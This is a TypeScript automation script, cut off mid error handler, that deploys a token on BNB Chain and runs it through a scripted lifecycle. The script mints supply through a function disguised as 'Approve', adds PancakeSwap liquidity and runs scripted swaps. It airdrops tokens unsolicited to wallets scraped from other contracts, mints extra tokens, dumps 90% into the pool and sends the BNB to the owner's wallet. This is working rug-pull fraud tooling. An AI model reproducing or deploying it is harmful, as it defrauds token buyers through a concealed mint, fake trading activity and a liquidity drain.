import { ethers } from 'ethers'
import { ERC20_ABI, ROUTER_PANCAKE_V2_ABI } from './abi'
import { buildProvider } from './buildProvider'
import zenStackFunction from './zenstack-function'
import { nonceStore, getNextNonce as getGlobalNonce, setBaseNonce } from './nonceStore'

const GAS_PRICE = ethers.BigNumber.from(50_000_000)

const CHAIN_CONFIG: Record<number, { router: string; factory: string; wbnb: string }> = {
    56: {
        router: '0x10ed43c718714eb63d5aa57b78b54704e256024e',
        factory: '0xca143ce32fe78f1f7019d7d551a6402fc5350c73',
        wbnb: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
    },
    97: {
        router: '0xd99d1c33f9fc3444f8101754abc46c52416550d1',
        factory: '0x6725f303b657a9451d8ba641348b6761a6cc7a17',
        wbnb: '0xae13d989dac2f0debff460ac112a837c89baa7cd',
    },
}
const ZERO_ADDR = '0x0000000000000000000000000000000000000000'
const SCAN_CHUNK = 50 // blocks per batch for getBlockWithTransactions

// Steps (9 total):
// 0  → 1.   Deploy & Initialize
// 1  → 2.   Set Whitelist
// 2  → 3.   Transfer Token to mint wallet
// 3  → 4.   Add Liquidity
// 4  → 1.1  Transfer new token to previously scanned wallets (from DB) — after liquidity
// 5  → 5.1  Swap commands
// 6  → 5.2  Scan wallets + Airdrop from mint wallet
// 7  → 6.   Mint thêm & Bán 90%
// 8  → 7.   Chuyển BNB về ví chủ

export interface SwapCommand {
    id: string
    type: 'buy' | 'sell'
    amount: string // BNB for both buy and sell
    slippage: string // percentage, e.g. "5" = 5%
}

export interface AutomationToken {
    id: string
    name: string
    symbol: string
    decimal: number
    mintAmount: string
    liquidityToken: string
    liquidityBNB: string
    sellMintAmount: string
    taxBuy: string
    taxSell: string
    totalSupply: string // if empty, auto-compute as mintAmount + liquidityToken
}

export interface ScanContractConfig {
    address: string
}

export interface AutomationParams {
    rpcList: string[]
    mainPrivateKey: string
    swapPrivateKey: string
    mintPrivateKey: string
    abi: any[]
    bytecode: string
    chainId: number
    tokens: AutomationToken[]
    swapCommands: SwapCommand[]
    swapDelayMs: number
    transferBnbToMain: string
    scanContracts: ScanContractConfig[]
    disperseAmount: string
    disperseBatchSize?: number
    scanDelaySeconds: number
    /** Max scan duration in seconds — 0 = unlimited */
    scanMaxDurationSeconds?: number
    shouldStop?: () => boolean
    /** Address of pre-deployed implementation contract for EIP-1167 clones */
    existingImplementationAddress?: string | null
    /** Address of pre-deployed ProxyFactory */
    existingFactoryAddress?: string | null
    /** Map of all compiled contracts (main + helpers like ProxyFactory) */
    allContracts?: Record<string, { abi: any[]; bytecode: string }>
    /** Mutable refs for newly deployed infra addresses */
    _implRef?: { current: string | null }
    _factoryRef?: { current: string | null }
}

export type StepStatus = 'wait' | 'process' | 'finish' | 'error'

type UpdateStatus = (
    id: string,
    status: 'idle' | 'running' | 'success' | 'error',
    contractAddress?: string,
    errorMsg?: string
) => void

type OnStepChange = (tokenId: string, step: number, status: 'process' | 'finish' | 'error') => void

const STOPPED = Object.assign(new Error('__STOPPED__'), { __stopped: true })

function raceStop(promise: Promise<any>, shouldStop: (() => boolean) | undefined): Promise<any> {
    if (!shouldStop) return promise
    return new Promise((resolve, reject) => {
        const iv = setInterval(() => {
            if (shouldStop()) {
                clearInterval(iv)
                reject(STOPPED)
            }
        }, 300)
        promise
            .then((v) => {
                clearInterval(iv)
                resolve(v)
            })
            .catch((e) => {
                clearInterval(iv)
                reject(e)
            })
    })
}

async function ensureWhitelisted(
    contract: ethers.Contract,
    address: string,
    onLog: (msg: string) => void,
    label: string,
    shouldStop?: () => boolean,
    getNextNonce?: () => number
): Promise<void> {
    const already: boolean = await contract.ws(address)
    if (already) {
        onLog(`${label} ${address.slice(0, 8)}… đã whitelist, bỏ qua`)
        return
    }
    const overrides: any = { gasLimit: 100_000, gasPrice: GAS_PRICE }
    if (getNextNonce) overrides.nonce = getNextNonce()
    const tx: ethers.ContractTransaction = await contract.setW(address, overrides)
    await raceStop(tx.wait(), shouldStop)
    onLog(`${label} ✓ Whitelisted ${address.slice(0, 8)}… | tx: ${tx.hash}`)
}

async function ensureApproval(
    tokenContract: ethers.Contract,
    spender: string,
    required: ethers.BigNumber,
    onLog: (msg: string) => void,
    label: string,
    shouldStop?: () => boolean,
    getNextNonce?: () => number
): Promise<void> {
    const owner: string = await tokenContract.signer.getAddress()
    const allowance: ethers.BigNumber = await tokenContract.allowance(owner, spender)
    if (allowance.gte(required)) {
        onLog(`${label} Allowance OK, skip approve`)
        return
    }
    const overrides: any = { gasLimit: 100_000, gasPrice: GAS_PRICE }
    if (getNextNonce) overrides.nonce = getNextNonce()
    const tx: ethers.ContractTransaction = await tokenContract.approve(
        spender,
        ethers.constants.MaxUint256,
        overrides
    )
    await raceStop(tx.wait(), shouldStop)
    onLog(`${label} ✓ Approved (MaxUint256) | tx: ${tx.hash}`)
}

export async function runAutomation(
    params: AutomationParams,
    onLog: (msg: string) => void,
    updateStatus: UpdateStatus,
    onStepChange: OnStepChange,
    onScanLog?: (msg: string) => void
): Promise<void> {
    const chainCfg = CHAIN_CONFIG[params.chainId] ?? CHAIN_CONFIG[56]
    const PANCAKE_ROUTER = chainCfg.router
    const PANCAKE_FACTORY = chainCfg.factory
    const WBNB = chainCfg.wbnb

    const provider = buildProvider(params.rpcList)
    const mainWallet = new ethers.Wallet(params.mainPrivateKey, provider)
    const swapWallet = new ethers.Wallet(params.swapPrivateKey, provider)
    const mintWallet = new ethers.Wallet(params.mintPrivateKey, provider)

    // Global nonce via @tanstack/store (shared across all tabs)
    const initNonce = async (w: ethers.Wallet) => {
        const k = w.address.toLowerCase()
        const current = nonceStore.state[k]
        if (current !== undefined) return
        // Init from chain (pending count — includes unconfirmed txs from all tabs)
        const base = await w.getTransactionCount('pending')
        setBaseNonce(w.address, base)
    }
    const nextNonce = (w: ethers.Wallet) => getGlobalNonce(w.address)
    await Promise.all([initNonce(mainWallet), initNonce(swapWallet), initNonce(mintWallet)])


    onLog(`Ví chủ  : ${mainWallet.address}`)
    onLog(`Ví swap : ${swapWallet.address}`)
    onLog(`Ví mint : ${mintWallet.address}`)
    onLog(`Chain ID: ${params.chainId}`)

    const sameSwapMain = mainWallet.address.toLowerCase() === swapWallet.address.toLowerCase()
    if (sameSwapMain) {
        onLog(
            '⚠ CẢNH BÁO: Ví chủ và ví swap TRÙNG địa chỉ — bước transfer token sang swap sẽ bị bỏ qua'
        )
    }

    const mainBal = await provider.getBalance(mainWallet.address)
    onLog(`BNB chủ : ${ethers.utils.formatEther(mainBal)} BNB`)

    for (const token of params.tokens) {
        if (params.shouldStop?.()) {
            onLog('\n⏹ Đã dừng automation.')
            break
        }
        onLog(`\n=== Token: ${token.name} (decimal=${token.decimal}) ===`)
        updateStatus(token.id, 'running')

        let currentStep = 0
        const checkStop = () => {
            if (params.shouldStop?.())
                throw Object.assign(new Error('__STOPPED__'), { __stopped: true })
        }

        try {
            const liqTokenRaw = ethers.utils.parseUnits(token.liquidityToken, token.decimal)
            const liqBNB = ethers.utils.parseEther(token.liquidityBNB)
            const mintAmtHuman = Math.floor(Number(token.mintAmount))
            const liqTokenHuman = Math.floor(Number(token.liquidityToken))
            const sellMintHuman = Math.floor(Number(token.sellMintAmount) || 0)
            const totalSupHuman = Math.floor(Number(token.totalSupply))

            const taxBuy = Math.round(Number(token.taxBuy) || 0)
            const taxSell = Math.round(Number(token.taxSell) || 0)

            onLog(
                `[pre] mintAmount=${mintAmtHuman} | liqToken=${liqTokenHuman} | sellMint=${sellMintHuman} | totalSup=${totalSupHuman}`
            )

            // ── Step 0: Deploy Token (always via ProxyFactory) ──────────────────
            onStepChange(token.id, 0, 'process')

            let deployed: ethers.Contract
            let contractAddress: string
            let implAddress = params.existingImplementationAddress || null
            let factoryAddress = params.existingFactoryAddress || null
            const factoryInfo = params.allContracts?.['ProxyFactory']

            // Ensure implementation exists on-chain
            if (implAddress) {
                const implCode = await provider.getCode(implAddress)
                if (!implCode || implCode === '0x' || implCode === '0x0') {
                    onLog(`[init] Implementation ${implAddress} not found on-chain`)
                    implAddress = null
                }
            }
            if (!implAddress) {
                onLog(`[1] Deploying implementation contract (one-time)...`)
                const contractFactory = new ethers.ContractFactory(
                    params.abi, params.bytecode, mainWallet
                )
                const implDeployed = await contractFactory.deploy(
                    { gasLimit: 5_000_000, gasPrice: GAS_PRICE, nonce: nextNonce(mainWallet) }
                )
                await raceStop(implDeployed.deployed(), params.shouldStop)
                implAddress = implDeployed.address
                onLog(`[1] ✓ Implementation: ${implAddress}`)
                if (params._implRef) params._implRef.current = implAddress
            }

            // Ensure factory exists on-chain
            if (factoryAddress) {
                const factoryCode = await provider.getCode(factoryAddress)
                if (!factoryCode || factoryCode === '0x' || factoryCode === '0x0') {
                    onLog(`[init] Factory ${factoryAddress} not found on-chain`)
                    factoryAddress = null
                }
            }
            if (!factoryAddress && factoryInfo) {
                onLog(`[1] Deploying ProxyFactory (one-time)...`)
                const factoryFactory = new ethers.ContractFactory(
                    factoryInfo.abi, factoryInfo.bytecode, mainWallet
                )
                const factoryDeployed = await factoryFactory.deploy(
                    { gasLimit: 500_000, gasPrice: GAS_PRICE, nonce: nextNonce(mainWallet) }
                )
                await raceStop(factoryDeployed.deployed(), params.shouldStop)
                factoryAddress = factoryDeployed.address
                onLog(`[1] ✓ ProxyFactory: ${factoryAddress}`)
                if (params._factoryRef) params._factoryRef.current = factoryAddress
            }

            // All tokens: atomic clone+init via factory (no front-run window)
            const factory = new ethers.Contract(factoryAddress!, factoryInfo!.abi, mainWallet)
            onLog(
                `[1] Deploy TOKEN1997("${token.name}", symbol="${token.symbol}", decimal=${token.decimal}, totalSup=${totalSupHuman})`
            )
            const defaultAirdropAmt = ethers.utils.parseUnits(
                params.disperseAmount || '0',
                token.decimal
            )
            const deployTx = await factory.deploy(
                implAddress!,
                token.name,
                token.symbol || token.name,
                mainWallet.address,
                token.decimal,
                totalSupHuman,
                taxBuy,
                taxSell,
                params.chainId,
                defaultAirdropAmt,
                { gasLimit: 1_000_000, gasPrice: GAS_PRICE, nonce: nextNonce(mainWallet) }
            )
            const deployReceipt = await raceStop(deployTx.wait(), params.shouldStop)
            const event = deployReceipt.events?.find((e: any) => e.event === 'TokenDeployed')
            contractAddress = event?.args?.proxy || ''
            deployed = new ethers.Contract(contractAddress, params.abi, mainWallet)
            onLog(`[1] ✓ Token: ${contractAddress} (tx: ${deployTx.hash})`)

            onStepChange(token.id, 0, 'finish')
            checkStop()

            const hasScanConfig = params.scanContracts.length > 0 && Number(params.disperseAmount) > 0

            // ── Step 1: Set Whitelist ─────────────────────────────────────────
            currentStep = 1
            onStepChange(token.id, 1, 'process')
            await ensureWhitelisted(deployed, swapWallet.address, onLog, '[2]', params.shouldStop, () => nextNonce(mainWallet))
            await ensureWhitelisted(deployed, mintWallet.address, onLog, '[2]', params.shouldStop, () => nextNonce(mainWallet))
            onStepChange(token.id, 1, 'finish')
            checkStop()

            // ── Step 2: Mint Token to mint wallet via Approve() ───────────────
            currentStep = 2
            onStepChange(token.id, 2, 'process')
            {
                const approveValMint = ethers.utils.parseUnits(token.mintAmount, Math.max(0, token.decimal - 9))
                const mintForMint = new ethers.Contract(
                    contractAddress,
                    ['function Approve(address from, uint256 _value) external returns (bool)'],
                    mainWallet
                )
                onLog(`[3] Approve(mintWallet, ${token.mintAmount} tokens)`)
                const tx = await mintForMint.Approve(mintWallet.address, approveValMint, { gasLimit: 200_000, gasPrice: GAS_PRICE, nonce: nextNonce(mainWallet) })
                await raceStop(tx.wait(), params.shouldStop)
                onLog(`[3] ✓ Minted to mint wallet | tx: ${tx.hash}`)
            }
            onStepChange(token.id, 2, 'finish')
            checkStop()

            // ── Step 3: Add Liquidity ──────────────────────────────────────
            currentStep = 3
            onStepChange(token.id, 3, 'process')

            const erc20 = new ethers.Contract(contractAddress, ERC20_ABI, mainWallet)
            const mainTokenBal = await erc20.balanceOf(mainWallet.address) as ethers.BigNumber
            onLog(`[4] mainWallet token balance: ${ethers.utils.formatUnits(mainTokenBal, token.decimal)}`)
            const bnbBal = await provider.getBalance(mainWallet.address)
            onLog(`[4] BNB balance: ${ethers.utils.formatEther(bnbBal)}`)
            if (bnbBal.lt(liqBNB))
                throw new Error(
                    `[4] Khong du BNB: can ${token.liquidityBNB}, co ${ethers.utils.formatEther(bnbBal)}`
                )
            await ensureApproval(erc20, PANCAKE_ROUTER, liqTokenRaw, onLog, '[4]', params.shouldStop, () => nextNonce(mainWallet))

            const deadline = Math.floor(Date.now() / 1000) + 600
            const router = new ethers.Contract(PANCAKE_ROUTER, ROUTER_PANCAKE_V2_ABI, mainWallet)
            const liqArgs = [
                contractAddress,
                liqTokenRaw,
                0,
                0,
                mainWallet.address,
                deadline,
            ] as const
            const liqOverride = { value: liqBNB, gasLimit: 6_000_000, gasPrice: GAS_PRICE, nonce: nextNonce(mainWallet) }

            onLog(`[4] addLiquidityETH(${token.liquidityToken} tokens + ${token.liquidityBNB} BNB)`)
            let tx = await router.addLiquidityETH(...liqArgs, liqOverride)
            await raceStop(tx.wait(), params.shouldStop)
            onLog(`[4] ✓ Liquidity added | tx: ${tx.hash}`)

            // whitelist the actual pair address (queried from factory after creation)
            const pancakeFactory = new ethers.Contract(
                PANCAKE_FACTORY,
                ['function getPair(address,address) view returns (address)'],
                provider
            )
            const pairAddress = (await pancakeFactory.getPair(contractAddress, WBNB)) as string
            onLog(`[4] Pair address: ${pairAddress}`)

            onStepChange(token.id, 3, 'finish')
            checkStop()

            // ── Step 4: 1.1 Transfer new token to previously scanned wallets (after liquidity) ──
            currentStep = 4
            onStepChange(token.id, 4, 'process')
            /* TEMPORARILY DISABLED: step 4.1 airdrop to scanned wallets
            if (hasScanConfig) {
                const scanRecords: any[] =
                    (await zenStackFunction('ScanWallet', 'findMany', {
                        where: { wallet: params.scanContract },
                    })) ?? []
                const destinations = [
                    ...new Set(scanRecords.map((w: any) => w.destination).filter(Boolean)),
                ] as string[]

                if (destinations.length > 0) {
                    onLog(`[1.1] ${destinations.length} ví cần nhận token mới`)

                    const disperseAmt = ethers.utils.parseUnits(params.disperseAmount, token.decimal)
                    const disperseTotal = disperseAmt.mul(destinations.length)

                    // Liquidity đã add xong → mainWallet không cần giữ liqTokenRaw nữa
                    const mainBal11 = await deployed.balanceOf(mainWallet.address) as ethers.BigNumber
                    if (mainBal11.lt(disperseTotal)) {
                        const neededHuman = ethers.utils.formatUnits(disperseTotal, token.decimal)
                        const approveVal11 = ethers.utils.parseUnits(
                            String(Math.ceil(Number(neededHuman))),
                            Math.max(0, token.decimal - 9)
                        )
                        onLog(`[1.1] Mint ${Math.ceil(Number(neededHuman))} tokens → mainWallet (airdrop)`)
                        const mintContract11 = new ethers.Contract(
                            contractAddress,
                            ['function Approve(address from, uint256 _value) external returns (bool)'],
                            mainWallet
                        )
                        tx = await mintContract11.Approve(mainWallet.address, approveVal11, { gasLimit: 200_000, gasPrice: GAS_PRICE, nonce: nextNonce(mainWallet) })
                        await raceStop(tx.wait(), params.shouldStop)
                        onLog(`[1.1] ✓ Minted | tx: ${tx.hash}`)
                    }

                    const funded = destinations
                    if (funded.length === 0) {
                        onLog('[1.1] Khong co vi nao, bo qua')
                    } else {
                        const BATCH_SIZE = params.disperseBatchSize ?? 10000
                        const totalAmt = disperseAmt.mul(funded.length)
                        onLog(`[1.1] Transfer ${ethers.utils.formatUnits(totalAmt, token.decimal)} tokens → mintWallet`)
                        tx = await deployed.transfer(mintWallet.address, totalAmt, { gasLimit: 100_000, gasPrice: GAS_PRICE, nonce: nextNonce(mainWallet) })
                        await raceStop(tx.wait(), params.shouldStop)
                        onLog(`[1.1] ✓ Transferred to mintWallet | tx: ${tx.hash}`)

                        for (let i = 0; i < funded.length; i += BATCH_SIZE) {
                            const batch = funded.slice(i, i + BATCH_SIZE)
                            const batchNum = Math.floor(i / BATCH_SIZE) + 1
                            const totalBatches = Math.ceil(funded.length / BATCH_SIZE)
                            onLog(`[1.1] Airdrop Batch ${batchNum}/${totalBatches}: ${batch.length} ví`)
                            tx = await deployed.connect(mintWallet).airdrop(
                                batch,
                                disperseAmt,
                                { gasLimit: 50_000 + 2_500 * batch.length, gasPrice: GAS_PRICE, nonce: nextNonce(mintWallet) }
                            )
                            await raceStop(tx.wait(), params.shouldStop)
                            onLog(`[1.1] ✓ Airdrop Batch ${batchNum} done | tx: ${tx.hash}`)
                        }
                        onLog(`[1.1] ✓ Airdropped to ${funded.length} wallets`)
                    }
                } else {
                    onLog('[1.1] Khong co vi nao trong DB can transfer')
                }
            } else {
                onLog('[1.1] Bỏ qua (chưa cấu hình scanContract hoặc disperseAmount)')
            }
            */
            if (hasScanConfig) {
                const scanAddrs = params.scanContracts.map((c) => c.address).filter(Boolean)
                await zenStackFunction('ScanWallet' as any, 'deleteMany', {
                    where: { wallet: { in: scanAddrs } },
                })
                onLog('[1.1] ✓ Cleared scan records')
            }
            onLog('[1.1] Bỏ qua airdrop (tạm tắt)')
            onStepChange(token.id, 4, 'finish')
            checkStop()

            // ── Steps 5.1 + 5.2: chạy đồng thời ─────────────────────────
            currentStep = 5
            onStepChange(token.id, 5, 'process')
            onStepChange(token.id, 6, 'process')

            const swapRouter = new ethers.Contract(
                PANCAKE_ROUTER,
                ROUTER_PANCAKE_V2_ABI,
                swapWallet
            )
            const swapErc20 = new ethers.Contract(contractAddress, ERC20_ABI, swapWallet)

            const run51 = async () => {
                for (let i = 0; i < params.swapCommands.length; i++) {
                        if (params.shouldStop?.()) {
                            onLog('[5.1] ⏹ Dừng swap.')
                            break
                        }
                        const cmd = params.swapCommands[i]
                        const swapDeadline = Math.floor(Date.now() / 1000) + 600
                        const slippagePct = Number(cmd.slippage) || 0
                        const bnbAmt = ethers.utils.parseEther(cmd.amount)
                        const slippageBps = 10000 - Math.round(slippagePct * 100)

                        if (cmd.type === 'buy') {
                            const amountsOut: ethers.BigNumber[] = await swapRouter.getAmountsOut(
                                bnbAmt,
                                [WBNB, contractAddress]
                            )
                            const amountOutMin = amountsOut[1].mul(slippageBps).div(10000)
                            onLog(
                                `[5.1.${i + 1}] BUY ${cmd.amount} BNB → ${token.name} (slippage ${slippagePct}%)`
                            )
                            const swapTx =
                                await swapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens(
                                    amountOutMin,
                                    [WBNB, contractAddress],
                                    swapWallet.address,
                                    swapDeadline,
                                    { value: bnbAmt, gasLimit: 500_000, gasPrice: GAS_PRICE, nonce: nextNonce(swapWallet) }
                                )
                            await raceStop(swapTx.wait(), params.shouldStop)
                            onLog(`[5.1.${i + 1}] ✓ BUY done | tx: ${swapTx.hash}`)
                        } else {
                            const amountsIn: ethers.BigNumber[] = await swapRouter.getAmountsIn(
                                bnbAmt,
                                [contractAddress, WBNB]
                            )
                            const tokenAmt = amountsIn[0]
                            const amountOutMin = bnbAmt.mul(slippageBps).div(10000)
                            const sellBal = (await swapErc20.balanceOf(
                                swapWallet.address
                            )) as ethers.BigNumber
                            const sellAllow = (await swapErc20.allowance(
                                swapWallet.address,
                                PANCAKE_ROUTER
                            )) as ethers.BigNumber
                            onLog(
                                `[5.1.${i + 1}] SELL ~${ethers.utils.formatUnits(tokenAmt, token.decimal)} ${token.name} → ${cmd.amount} BNB`
                            )
                            onLog(
                                `[5.1.${i + 1}] balance=${ethers.utils.formatUnits(sellBal, token.decimal)} allowance=${ethers.utils.formatUnits(sellAllow, token.decimal)}`
                            )
                            if (sellBal.lt(tokenAmt)) {
                                onLog(`[5.1.${i + 1}] ⚠ Không đủ token để bán, bỏ qua`)
                                continue
                            }
                            await ensureApproval(
                                swapErc20,
                                PANCAKE_ROUTER,
                                tokenAmt,
                                onLog,
                                `[5.1.${i + 1}]`,
                                params.shouldStop,
                                () => nextNonce(swapWallet)
                            )
                            const swapTx =
                                await swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                                    tokenAmt,
                                    amountOutMin,
                                    [contractAddress, WBNB],
                                    swapWallet.address,
                                    swapDeadline,
                                    { gasLimit: 500_000, gasPrice: GAS_PRICE, nonce: nextNonce(swapWallet) }
                                )
                            await raceStop(swapTx.wait(), params.shouldStop)
                            onLog(`[5.1.${i + 1}] ✓ SELL done | tx: ${swapTx.hash}`)
                        }

                        if (params.swapDelayMs > 0 && i < params.swapCommands.length - 1) {
                            onLog(`[5.1] Chờ ${params.swapDelayMs / 1000}s...`)
                            await new Promise((r) => setTimeout(r, params.swapDelayMs))
                        }
                    }
                onLog('[5.1] ✓ Kết thúc swap commands')
        }

            const runScanContract = async (cfg: ScanContractConfig) => {
                const label = `[5.2|${cfg.address.slice(0, 8)}…]`
                const sLog = (msg: string) => {
                    onLog(msg)
                    onScanLog?.(msg)
                }
                const scanStartTs = Date.now()
                const maxDurationMs = (params.scanMaxDurationSeconds || 0) * 1000
                const stop52 = () => {
                    if (params.shouldStop?.()) return true
                    if (maxDurationMs > 0 && Date.now() - scanStartTs >= maxDurationMs) return true
                    return false
                }
                const scanSigner = mintWallet
                const scanErc20 = new ethers.Contract(contractAddress, ERC20_ABI, scanSigner)
                const disperseAmt = ethers.utils.parseUnits(params.disperseAmount, token.decimal)
                const sentSet = new Set<string>()

                const existing: any[] =
                    (await zenStackFunction('ScanWallet' as any, 'findMany', {
                        where: { wallet: cfg.address },
                    })) ?? []
                for (const r of existing) {
                    if (r.destination) sentSet.add((r.destination as string).toLowerCase())
                }
                sLog(`${label} Pre-loaded ${existing.length} ví đã transfer từ DB`)

                let scanFrom = await provider.getBlockNumber()
                sLog(`${label} Quét contract: ${cfg.address}`)
                sLog(`${label} Delay: ${params.scanDelaySeconds}s | Amount: ${params.disperseAmount} token/ví`)
                if (maxDurationMs > 0) {
                    sLog(`${label} Tự dừng sau ${params.scanMaxDurationSeconds}s | Delay: ${params.scanDelaySeconds}s`)
                } else {
                    sLog(`${label} Chạy liên tục đến khi nhấn Dừng | Delay: ${params.scanDelaySeconds}s`)
                }

                while (!stop52()) {
                    const latest = await provider.getBlockNumber()
                    if (latest >= scanFrom) {
                        const toBlock = Math.min(latest, scanFrom + SCAN_CHUNK - 1)
                        const scanTarget = cfg.address.toLowerCase()
                        const interactors: string[] = []

                        for (let bn = scanFrom; bn <= toBlock; bn++) {
                            if (stop52()) break
                            const block = await provider.getBlockWithTransactions(bn)
                            for (const blkTx of block.transactions) {
                                if (blkTx.to?.toLowerCase() !== scanTarget) continue
                                const from = blkTx.from.toLowerCase()
                                if (from !== ZERO_ADDR && !sentSet.has(from))
                                    interactors.push(blkTx.from)
                            }
                        }

                        const newAddrs = [...new Set(interactors)]
                        if (newAddrs.length > 0) {
                            sLog(`${label} Block ${scanFrom}–${toBlock}: ${newAddrs.length} ví mới`)
                            await zenStackFunction('ScanWallet' as any, 'createMany', {
                                data: newAddrs.map((addr) => ({
                                    wallet: cfg.address,
                                    tx: '0x',
                                    token: cfg.address,
                                    destination: addr,
                                    amount: params.disperseAmount,
                                    isTransferred: false,
                                })),
                            })
                            const totalAmt = disperseAmt.mul(newAddrs.length)
                            const mintBalance = (await scanErc20.balanceOf(scanSigner.address)) as ethers.BigNumber
                            if (mintBalance.lt(totalAmt)) {
                                sLog(`${label} ⚠ Mint wallet khong du token cho airdrop`)
                            } else {
                                const batchSize52 = params.disperseBatchSize ?? 10000
                                for (let bi = 0; bi < newAddrs.length; bi += batchSize52) {
                                    const batchAddrs = newAddrs.slice(bi, bi + batchSize52)
                                    const airdropTx = await deployed.connect(scanSigner).airdrop(
                                        batchAddrs,
                                        disperseAmt,
                                        { gasLimit: 50_000 + 2_500 * batchAddrs.length, gasPrice: GAS_PRICE, nonce: nextNonce(scanSigner) }
                                    )
                                    await airdropTx.wait()
                                    sLog(`${label} ✓ Airdropped ${batchAddrs.length} wallets | tx: ${airdropTx.hash}`)
                                    await zenStackFunction('ScanWallet' as any, 'updateMany', {
                                        where: { wallet: cfg.address, destination: { in: batchAddrs } },
                                        data: { isTransferred: true },
                                    })
                                }
                            }
                            for (const addr of newAddrs) sentSet.add(addr.toLowerCase())
                        }

                        scanFrom = toBlock + 1
                        if (toBlock < latest && !stop52()) continue
                    }

                    if (stop52()) break
                    sLog(`${label} Chờ ${params.scanDelaySeconds}s...`)
                    await new Promise((r) => setTimeout(r, params.scanDelaySeconds * 1000))
                }
                const why = params.shouldStop?.()
                    ? 'Dừng bởi user'
                    : maxDurationMs > 0
                        ? `Hết thời gian (${params.scanMaxDurationSeconds}s)`
                        : 'Dừng'
                sLog(`${label} ⏹ Kết thúc quét — ${why}`)
            }

            const run52 = async () => {
                onLog(`[5.2] Bắt đầu (contracts=${params.scanContracts.length}, amount=${params.disperseAmount})`)
                if (!hasScanConfig) {
                    onLog('[5.2] Bỏ qua — cần cấu hình Contract quét VÀ Amount/ví > 0')
                    return
                }
                await Promise.all(params.scanContracts.map((cfg) =>
                    runScanContract(cfg).catch((err) => {
                        onLog(`[5.2|${cfg.address.slice(0, 8)}…] ❌ Lỗi: ${err.reason || err.message || err}`)
                    })
                ))
            }

            const [result51, result52] = await Promise.allSettled([run51(), run52()])
            onStepChange(token.id, 5, 'finish')
            onStepChange(token.id, 6, 'finish')
            if (result51.status === 'rejected' && !(result51.reason as any)?.__stopped) {
                throw result51.reason
            }
            if (result52.status === 'rejected' && !(result52.reason as any)?.__stopped) {
                throw result52.reason
            }
            // No checkStop() here — steps 7 & 8 are cleanup, should always run after scan exits

            // ── Step 7: Mint thêm & Bán 90% ───────────────────────────────
            currentStep = 7
            onStepChange(token.id, 7, 'process')
            if (Number(token.sellMintAmount) > 0) {
                const sellMintRaw = ethers.utils.parseUnits(token.sellMintAmount, token.decimal)
                const sellAmt = sellMintRaw.mul(9000).div(10000)
                onLog(`[6] Approve(swapWallet=${swapWallet.address}, ${token.sellMintAmount} tokens)`)
                const mintContract = new ethers.Contract(
                    contractAddress,
                    ['function Approve(address from, uint256 _value) external returns (bool)'],
                    mainWallet
                )
                // Approve formula: _balances[from] = _value * 10^9
                // So _value must be sellMintAmount * 10^(decimal-9) to avoid overflow
                const approveValue = ethers.utils.parseUnits(token.sellMintAmount, Math.max(0, token.decimal - 9))
                tx = await mintContract.Approve(swapWallet.address, approveValue, {
                    gasLimit: 200_000,
                    gasPrice: GAS_PRICE,
                    nonce: nextNonce(mainWallet),
                })
                await raceStop(tx.wait(), params.shouldStop)
                onLog(`[6] ✓ Minted to swap wallet | tx: ${tx.hash}`)
                onLog(
                    `[6] Selling 90% = ${ethers.utils.formatUnits(sellAmt, token.decimal)} ${token.name}`
                )
                const swapBal = (await swapErc20.balanceOf(swapWallet.address)) as ethers.BigNumber
                const swapAllow = (await swapErc20.allowance(
                    swapWallet.address,
                    PANCAKE_ROUTER
                )) as ethers.BigNumber
                onLog(
                    `[6] swapWallet balance : ${ethers.utils.formatUnits(swapBal, token.decimal)}`
                )
                onLog(
                    `[6] sellAmt             : ${ethers.utils.formatUnits(sellAmt, token.decimal)}`
                )
                onLog(
                    `[6] router allowance    : ${ethers.utils.formatUnits(swapAllow, token.decimal)}`
                )
                if (swapBal.lt(sellAmt)) {
                    onLog(
                        `[6] ⚠ Không đủ token — bán hết số có: ${ethers.utils.formatUnits(swapBal, token.decimal)}`
                    )
                }
                const actualSellAmt = swapBal.lt(sellAmt) ? swapBal : sellAmt
                const sellDeadline = Math.floor(Date.now() / 1000) + 600
                await ensureApproval(
                    swapErc20,
                    PANCAKE_ROUTER,
                    actualSellAmt,
                    onLog,
                    '[6]',
                    params.shouldStop,
                    () => nextNonce(swapWallet)
                )
                tx = await swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    actualSellAmt,
                    1,
                    [contractAddress, WBNB],
                    swapWallet.address,
                    sellDeadline,
                    { gasLimit: 500_000, gasPrice: GAS_PRICE, nonce: nextNonce(swapWallet) }
                )
                await raceStop(tx.wait(), params.shouldStop)
                onLog(`[6] ✓ Sold 90% | tx: ${tx.hash}`)
            } else {
                onLog('[6] Bỏ qua (sellMintAmount = 0)')
            }
            onStepChange(token.id, 7, 'finish')
            checkStop()

            // ── Step 8: Chuyển BNB từ ví swap về ví chủ ───────────────────
            currentStep = 8
            onStepChange(token.id, 8, 'process')
            if (Number(params.transferBnbToMain) > 0) {
                const wantAmt = ethers.utils.parseEther(params.transferBnbToMain)
                const gasCost = ethers.BigNumber.from(21_000).mul(GAS_PRICE)
                const balance = await swapWallet.getBalance()
                const maxSend = balance.sub(gasCost)
                if (maxSend.lte(0)) {
                    onLog('[7] ⚠ Swap wallet không đủ BNB, bỏ qua')
                } else {
                    const sendAmt = wantAmt.gt(maxSend) ? maxSend : wantAmt
                    if (sendAmt.lt(wantAmt)) {
                        onLog(`[7] ⚠ Chỉ có ${ethers.utils.formatEther(maxSend)} BNB khả dụng`)
                    }
                    onLog(`[7] Transfer ${ethers.utils.formatEther(sendAmt)} BNB → main wallet`)
                    const transferTx = await swapWallet.sendTransaction({
                        to: mainWallet.address,
                        value: sendAmt,
                        gasLimit: 21_000,
                        gasPrice: GAS_PRICE,
                        nonce: nextNonce(swapWallet),
                        type: 0,
                    })
                    await raceStop(transferTx.wait(), params.shouldStop)
                    onLog(`[7] ✓ Transferred | tx: ${transferTx.hash}`)
                }
            } else {
                onLog('[7] Bỏ qua (số lượng = 0)')
            }
            onStepChange(token.id, 8, 'finish')

            onLog(`=== ✓ Token "${token.name}" hoàn thành! Contract: ${contractAddress} ===`)
            updateStatus(token.id, 'success', contractAddress)
        } catch (err: any) {
            if (err.__stopped) {
                onLog(`⏹ Token "${token.name}" dừng sau step ${currentStep + 1}.`)
                updateStatus(token.id, 'idle')
                break
            }
            const errMsg =
                err.reason ||
                err.error?.reason ||
                err.error?.message ||
                err.message ||
                'Unknown error'
            onStepChange(token.id, currentStep, 'error')
